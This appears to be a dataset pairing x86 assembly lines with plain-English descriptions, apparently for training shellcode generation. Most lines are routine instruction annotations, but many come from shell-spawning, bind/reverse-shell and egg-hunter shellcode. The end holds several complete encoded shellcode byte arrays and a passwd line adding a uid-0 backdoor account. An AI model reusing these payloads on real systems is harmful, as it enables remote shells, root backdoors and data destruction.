push esi \n push edi	push /bin//sh in stack
push esi \n push edi	push esi and edi content on stack
push esi \n push edi \n push edx	push esi, edi and edx content on stack
push esp	push esp content on stack
push esp	push the memory location of param 1(sizeof) onto the stack
push esp	push the contents of esp register onto the stack
push esp	push the contents of the esp register onto the stack
push esp	push the esp onto the stack
push esp	push esp to the stack
push esp	push esp onto the stack
push len	push len onto the stack
push len \n pop edx	save len into edx registe
push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp	move the string /bin//sh on ebx register
push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp	put /bin/sh into the ecx register
push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp	put /bin/sh into the edx register
push name	push name onto the stack
push offset printf_msg	push address of string print_msg
push ogin	push the contents in ogin onto the stack
push rcx	push the immediate value stored in rcx onto the stack
push sock_reg	push sock_reg onto the stack
push sock_reg	push the sock_reg onto the stack
push sys_execve	push sys_execve onto the stack
push sys_execve \n pop eax	set sys_execve = 11 to eax
push word [edx]	push edx content as a word on stack
push word [edx]	push the word [edx] onto the stack
push word [edx]	push the word [edx] to the stack
push word 0544o	push the word 0544o onto the stack
push word 0544o \n pop ecx	allow permissions r-xr--r—save them into ecx
push word 0644o	push the word 0644o onto the stack
push word 0666q	set read-write permission
push word 0666q	push the word 0666q onto the stack
push word 0x02	push af_inet on the stack
push word 0x02	push af_inet = 2 on stack
push word 0x02	push the word 0x02 onto the stack
push word 0x0a	push the argument pf_inet6 = 10 on stack
push word 0x0a	push the argument af_inet6 = 10 on stack
push word 0x0a	push word af_inet6
push word 0x0a	push af_inet6 = 10 as word on stack
push word 0x0a	push af_inet = 0x0a
push word 0x0a	push the word 0x0a onto the stack
push word 0x0a	push the word 0x0a to the stack
push word 0x0f27	push the word 0x0f27 onto the stack
push word 0x1b6	push the word 0x1b6 to the stack
push word 0x1b6	push the word 0x1b6 onto the stack
push word 0x1b6 \n pop ecx	save read-write permission in ecx register
push word 0x1ff	push the word 0x1ff onto the stack
push word 0x2	push the word 0x2 on stack
push word 0x2	push hexadecimal value 0x2 on stack
push word 0x2	push hexadecimal value 0x2 as a word on stack
push word 0x2	push af_inet on stack
push word 0x2	push af_inet = 2
push word 0x2	push the arg af_inet onto the stack
push word 0x2	push the word 0x2 onto the stack
push word 0x2	push the word 0x2 to the stack
push word 0x2923	push 0x2923 onto stack port
push word 0x2e2e	push the word 0x2e2e onto the stack
push word 0x3436	push the value 46 on the stack
push word 0x3436	push the word 0x3436 onto the stack
push word 0x3582	push port 0x3582 as a word
push word 0x3582	push port number 0x3582 as a word on stack
push word 0x3582	push the word 0x3582 onto the stack
push word 0x3636	push the word 0x3636 onto the stack
push word 0x3905	push the value of the port, 1337, on 32 bit in big endian format
push word 0x3905	push the value of port 1336 on 32 bit on stack
push word 0x3905	push the word 0x3905 to the stack
push word 0x3905	push the word 0x3905 onto the stack
push word 0x3930	push the word 0x3930 onto the stack
push word 0x401f	push the word 0x401f onto the stack
push word 0x4255	push the word 0x4255 onto the stack
push word 0x462d	push ‘-f’ on stack
push word 0x462d	push the word 0x462d to the stack
push word 0x462d	push the word 0x462d onto the stack
push word 0x5000	push 0x5000 onto stack port
push word 0x5445	push the word 0x5445 onto the stack
push word 0x5974	push the word 0x5974 onto the stack
push word 0x5c11	insert the 32bit value 4444 on the stack
push word 0x5c11	push the hexdadecimal value of 4444 on the stack
push word 0x5c11	push the number of the port, 4444, on the stack
push word 0x5c11	push the value 4444 of the port on stack
push word 0x5c11	push dword port value = 4444
push word 0x5c11	push port value = 4444 as a word
push word 0x5c11	push port value 4444 as word on stack
push word 0x5c11	push 0x5c11 onto the stack (port:4444)
push word 0x5c11	push the port number 4444 (hex) on stack
push word 0x5c11	push port number 4444 as a word
push word 0x5c11	push htons(4444)
push word 0x5c11	set the port to bind on, in reverse order is 4444
push word 0x5c11	push the word 0x5c11 onto the stack
push word 0x5c11	push the word 0x5c11 to the stack
push word 0x632d	push -c param on the stack
push word 0x632d	push the word paramenter -c on the stack
push word 0x632d	push the parameter “c-“ as a word on stack
push word 0x632d	push the value ‘-c’ on stack
push word 0x632d	push the word 0x632d onto the stack
push word 0x632d	push the word 0x632d to the stack
push word 0x632d \n mov eax, esp	push the word 0x632d onto the stack and point the eax register to the stack register
push word 0x632d \n mov ebx, esp	push the word 0x632d onto the stack and point the ebx register to the stack register
push word 0x632d \n mov ecx, esp	push the word 0x632d onto the stack and point the ecx register to the stack register
push word 0x632d \n mov edi, esp	push the word 0x632d onto the stack and point the edi register to the stack register
push word 0x632d \n mov edx, esp	push the word 0x632d onto the stack and point the edx register to the stack register
push word 0x632d \n mov esi, esp	push the word 0x632d onto the stack and point the esi register to the stack register
push word 0x6465	push the word 0x6465 onto the stack
push word 0x6465 \n push 0x7268732f \n push 0x6e69622f \n push 0x7273752f \n mov ebx, esp	load the strig /usr/bin/shred in ebx regiter
push word 0x662d	push the word 0x662d onto the stack
push word 0x662d \n mov eax, esp	push the word 0x662d onto the stack and point the eax register to the stack register
push word 0x662d \n mov ebx, esp	push the word 0x662d onto the stack and point the ebx register to the stack register
push word 0x662d \n mov ecx, esp	push the word 0x662d onto the stack and point the ecx register to the stack register
push word 0x662d \n mov edi, esp	push the word 0x662d onto the stack and point the edi register to the stack register
push word 0x662d \n mov edx, esp	push the word 0x662d onto the stack and point the edx register to the stack register
push word 0x662d \n mov esi, esp	load the hexadecimal word value 0x6632d in esi register
push word 0x662d \n mov esi, esp	push the word 0x662d onto the stack and point the esi register to the stack register
push word 0x6666	push the word 0x6666 onto the stack
push word 0x6873	push the word 0x6873 onto the stack
push word 0x692d	push the word 0x692d onto the stack
push word 0x697a	push the word 0x697a onto the stack
push word 0x6d6f	push the word 0x6d6f onto the stack
push word 0x6f64	push the word 0x6f64 to the stack
push word 0x6f64	push the word 0x6f64 onto the stack
push word 0x7065	push the word 0x7065 onto the stack
push word 0x722d	push the word 0x722d onto the stack
push word 0x7365	push the word 0x7365 onto the stack
push word 0x736e	push the word 0x736e onto the stack
push word 0x776f	push the word 0x776f onto the stack
push word 0x7773	push the word 0x7773 to the stack
push word 0x7773	push the word 0x7773 onto the stack
push word 0x8223	push port number 9090 on stack
push word 0x8223	push the word 0x8223 onto the stack
push word 0xaaaa	push the word 0xaaaa onto the stack
push word 0xb315	push port number 5555 (little-endian)
push word 0xb315	push the word 0xb315 onto the stack
push word 0xc005	push sin6_port 2 byte (port 1472) on stack
push word 0xc005	push port 1472 (hex)
push word 0xc005	push the word 0xc005 onto the stack
push word 0xc005	push the word 0xc005 to the stack
push word 0xffff	push the hexadecimal value 0xffff on stack
push word 0xffff	push the word 0xffff onto the stack
push word 0xffff	push the word 0xffff to the stack
push word 1 \n mov eax, esp	push the word 1 onto the stack and point eax to the stack register
push word 10	push sa_family_t=2 byte on stack
push word 10	push the word 10 to the stack
push word 100	push the word 100 onto the stack
push word 17 \n mov edx, esp	push the word 17 onto the stack and point edx to the stack register
push word 2	push 2 onto stack
push word 2	push the word 2 onto the stack
push word 2 \n mov ecx, esp	push the word 2 onto the stack and point ecx to the stack register
push word 21 \n mov ebx, esp	push the word 21 onto the stack and point ebx to the stack register
push word ax	push ax content represented on 32 bit on stack
push word ax	push the word ax onto the stack
push word bx	push the 32 bit register bx on the stack
push word bx	push af_inet =2 as a word
push word bx	push sin6_addr on 16 byte, saved in bx, on stack
push word bx	push af_inet as a word
push word bx	push the word bx onto the stack
push word bx	push the word bx to the stack
push word cx	push af_inet = 2
push word cx	push the word cx onto the stack
push zero_reg	push the zero_reg onto the stack
push zero_reg	push zero_reg onto the stack
push_cmd:	declare push_cmd label
push_cmd:	declare the push_cmd label
pusha	pushe all general purpose registers onto the stack in the following order: (e)ax, (e)cx, (e)dx, (e)bx, (e)sp, (e)bp, (e)si, (e)di. the value of sp is the value before the actual push of sp.
pushl $0x68732f2f	push $0x68732f2f onto the stack
pushl $0x6e69622f	push $0x6e69622f onto the stack
pushw $0x632d	push $0x632d onto the stack
pushw 0x2	push 2 on stack as a word
pushw 0x2	push af_inet = 2
pushw 0x2	push af_inet=2 as a word on stack
pushw 0x3905	push the value of port 1336 as a word on stack
pushw 0x3905	push the 0x3905 onto the stack
pushw 0x682d	push the 0x682d onto the stack
pushw 0x697a	push the 0x697a onto the stack
pushw 0xb315	push port number 5555 (little-endian)
pushw 0xb822	push pot number 47138 as a word on stack
pushw 0xe324	push port number on stack as a word
pxor mm0, mm1	run pxor operation between mm0 and mm1
pxor mm0, mm1	perform xor operation
R1: \n inc esi	in the routine R1 point to the next byte in esi
R1: \n inc esi \n inc esi	in the routine R1 point to the next word in esi
R1: \n pop esi	in the routine R1 save the shellcode in esi
R2: \n inc esi	declare R2 and point to the next byte in esi
R2: \n inc esi \n inc esi	declare R2 and point to the next word in esi
rcl al,1	rotate the bits into al register to the left for 1 time
re	define label re
read_file:	define read_file_label
read:	define read_label
read:	define _read label
read:	declare the read label
reading:	define _reading label
reading:	declare the reading label
real_number1 dd 1234	define the doubleword variable real_number1 and initialize to 1234
real_number2 dd 123456	define the doubleword variable real_number2 and initialize 123456
realarray resq 10	reserve an array of ten reals for realarray
realarray resq 10	reserve array realarray of 10 real numbers
reseting the register	pushing null terminator
ret	transfer control to the previous instruction address saved on stack
ret	return
ret	return the address off the stack and returns control to that location
ret	return to our program
ret	return to the address on the top of the stack
ret	return to where the function was called
ret	return to caller
ret 0x8585	transfer control to the instruction at the adress 0x8585
ret 0xc885	transfer control to the instruction at the adress 0x8585
retry:	define _retry label
retry:	declare retry label
returnlabel:	returnlabel label
rol byte [esi], 0x1	rol decode with 1 offset
rol byte [esi], 0x1	left rotate the byte in esi 1 time
rol byte [esi], 0x1	left rotate the shellcode by one
rol byte [esi], 0x2	left shift all bits of esi 2 times
rol byte [esi], 0x2	left rotate the byte at the address esi by 0x2 bits
rol byte [esi], 0x2	left rotate the byte in esi 2 times
rol byte [esi], 4	execute a rotation to the left of the first character pointed from esi for 4 times
rol byte [esi], 4	rotate 4 bits left the byte starting at the address esi
rol edi, 1	left rotate the contents of the edi register by 1 bit
rol edi, 1	left rotate the edi register 1 time
rol edx, 0x4	left shift all bits of edx 4 times
rol edx, 0x4	left rotate the contents of the edx register by 0x4 bits
rol edx, 0x4	left rotate the edx register 4 times
ror bl, cl	right rotate bl by the contents of cl
ror byte [esi], 0x1	ror decode with 1 offset
ror byte [esi], 0x1	right rotate the byte in esi 1 time
ror byte [esi], 0x1	right rotate the shellcode in esi by one
ror esi, 1	right rotate esi 1 time
ror esi, 1	right rotate the contents of the esi register by 1 bit
rot_decode:	define rot_decode_label
rotate:	declare _rotate label
rotate:	declare the rotate label
S1: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	S1 is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73
S2: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
S3: dw 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	S3 is an array of words 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73
S4: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
sar eax, 23	right shift the contents of eax by 23 bits
sar eax, 31	right shift the contents of eax by 31 bits
sar ebx, 31	right shift the contents of ebx by 31 bits
sar ecx, 2	right shift the value of register ecx by 2 bits
sar edx, 4	right shift the value of register edx by 4 bits
scas eax,dword ptr es:[edi]	compare value at location edi with eax register
scasd	check if [edi] == eax then increment edi while
scasd	compare eax with doubleword at edi and set status flags
scasd	compare the contents of the eax register with doubleword at edi and set status flags
scasd	compare the value in eax to the doubleword addressed by edi
scasd	compare the value in the eax register to the doubleword addressed by the edi register
scasd \ jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _end	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _start	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _start \n jmp edi	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _start \n scasd \n jnz _start	checking current address with egg two times
scasd \n jnz IncAddr	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz IncAddr \n jmp edi	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz next_addr \n scasd \n jnz next_addr	check if [edi] == eax then increment edi while if no match go to next_addr label. repeat two times
scasd \n l1 IncAddr	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n l1 IncAddr \n jmp edi	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
search_the_egg:	define search_the_egg label
section .bss	declare section containing uninitialized data
section .bss	declare the bss section
section .bss	section bss
section .bss	declare section bss
section .bss	declare bss section
section .bss	declare code section .bss
section .data	declare section .data
section .data	delcare section .data
section .data	define section .data
section .data	declare section containing initialized data
section .data	declare the data section
section .data	section data
section .data	section for initialized data
section .data	declare data section
section .data \n section .bss \n section .text \n global _start \n _start:	declare section.data, section .bss, section.text, global _start, _start label
section .text	declare text section
section .text	declare section containing code
section .text	declare section text
section .text	declare the text section
section .text	section .text
section .text	declare .text section
section .text	declare code section
section .text	section text
section .text \n _start:	declare section .data and _start label
section .text \n global _start \n _start:	declare section .text, global _start, _start:
section .text \n global _start \n _start:	declare section. text, global _start, _start label
section .text \n global _start \n _start:	declare section.text, global _start and _start label
section .text \n global _start \n _start:	delcare section .text, global _start and _start label
set_argv:	declare set_argv label
set_argv:	declare the set_argv label
set_argv:	define set_argv label
set_mark:	define set_mark label
set_mark:	declare the set_mark label
setup:	define _steup label
setup:	declare the setup label
shell_ret:	define shell_ret label
shell_ret:	declare the shell_ret label
shell:	define _ shell label
shell:	define _shell label
shell:	declare the shell label
shellcode_length equ $-shellcode	define the size of the shellcode = 25 byte
shellcode_length equ $-shellcode	define shellcode_length equal to the size of shellcode
shellcode_section \n call decoder	in shellcode_section go to decoder's main
shellcode:	declare _shellcode label
shellcode:	delcare shellcode_label
shellcode:	define _shellcode label
shellcode:	declare shellcode_label
shellcode:	define shellcode_ label
shellcode:	define shellcode label
shellcode:	declare the shellcode label
shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash'	define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
"shellcode: db ""vl43ck:$6$bxwjfzor$muhuwo0mugdkwfppeydqgzpm.ytpmi/gam4lvqhp21lfnwmsj821kvjniyoodytbh.sf9ar7ciqbrccw5bgjx0:0:0:vl43ck:/tmp:/bin/bash”"	"define the shellcode: ""vl43ck:$6$bxwjfzor$muhuwo0mugdkwfppeydqgzpm.ytpmi/gam4lvqhp21lfnwmsj821kvjniyoodytbh.sf9ar7ciqbrccw5bgjx0:0:0:vl43ck:/tmp:/bin/bash”"
shellcode: db 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88	define shellcode as the array of bytes 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88
shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87	define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
shellcode: db 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4	shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4
shellcode: db 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d	define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d
shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23	define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01	define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
shellcode: db 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa	define the shellcode 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
